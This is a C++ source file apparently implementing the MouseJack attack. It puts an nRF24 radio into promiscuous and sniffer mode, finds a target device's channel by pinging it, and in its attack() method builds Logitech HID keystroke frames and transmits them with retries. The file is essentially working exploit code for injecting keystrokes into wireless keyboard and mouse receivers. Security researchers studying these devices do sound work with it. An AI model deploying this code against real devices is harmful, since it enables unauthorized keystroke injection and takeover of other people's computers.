
#include "MouseJack.h"
#include <algorithm>
#include <iostream>
#include <sstream>

unsigned char MouseJack::ping[4] = { 0x0f, 0x0f, 0x0f, 0x0f };

MouseJack::MouseJack(bool reset /*= false*/)
{
	init_radio(reset);
}


MouseJack::~MouseJack()
{
	if (m_nrf24 != NULL) {
		delete m_nrf24;
		m_nrf24 = NULL;
	}
}


std::string MouseJack::from_display(std::string address)
{
	address.erase(std::remove(address.begin(), address.end(), ':'), address.end());
	
	std::string result;
	for (int i = address.size() - 2; i >= 0; i -= 2)
	{
		std::string s = address.substr(i, 2);
		std::stringstream str;
		str << s;
		int value = 0;
		str >> std::hex >> value;
		result.append(1, value);
	}

	return result;
}

void MouseJack::init_radio(bool reset)
{
	m_nrf24 = new nrf24();
	if (m_nrf24 != NULL) {
		m_nrf24->enable_lna();
		m_nrf24->enter_promiscuous_mode();
	}
}

void MouseJack::sniffer_mode(std::string address)
{
	m_nrf24->enter_sniffer_mode(address);
}

int MouseJack::find_channel(std::string address)
{
	std::string ping_payload;
	for (size_t ii = 0; ii < sizeof(ping); ii++)
	{
		ping_payload.append(1, ping[ii]);
	}
	
	m_nrf24->enter_sniffer_mode(address);
	for (unsigned int i = min_channel; i < max_channel; i++)
	{
		m_nrf24->set_channel(i);
		if (m_nrf24->transmit_payload(ping_payload)){
			return i;
		}
	}
	return -1;
}

void MouseJack::set_channel(int channel)
{
	m_nrf24->set_channel(channel);
}

bool MouseJack::transmit_payload(std::string payload)
{
	return m_nrf24->transmit_payload(payload);
}

 
bool MouseJack::attack(HidLogitech& hid, std::vector<blank_entry>& attack)
{
	hid.build_frames(attack);
	for (size_t i = 0; i < attack.size(); i++)
	{
		blank_entry* curr_key = &attack[i];
		if (curr_key->frames.size() > 0) {
			for each (frame_entry curr_frame in curr_key->frames)
			{
				bool ret = this->transmit_payload(curr_frame.frame);
				//std::cout << "transmit_payload pre: " << ret << std::endl;
				int retry_times = 0;
				if (!ret) {
					//retry 10 times
					for (; retry_times < 10; retry_times++)
					{
						ret = this->transmit_payload(curr_frame.frame);
						if (ret) {
							break;
						}
					}
				}
				//std::cout << "transmit_payload retry end: " << ret << " retry_times:" << retry_times << std::endl;
				Sleep(curr_frame.frame_sleep);
			}
		}
	}
	return false;
}
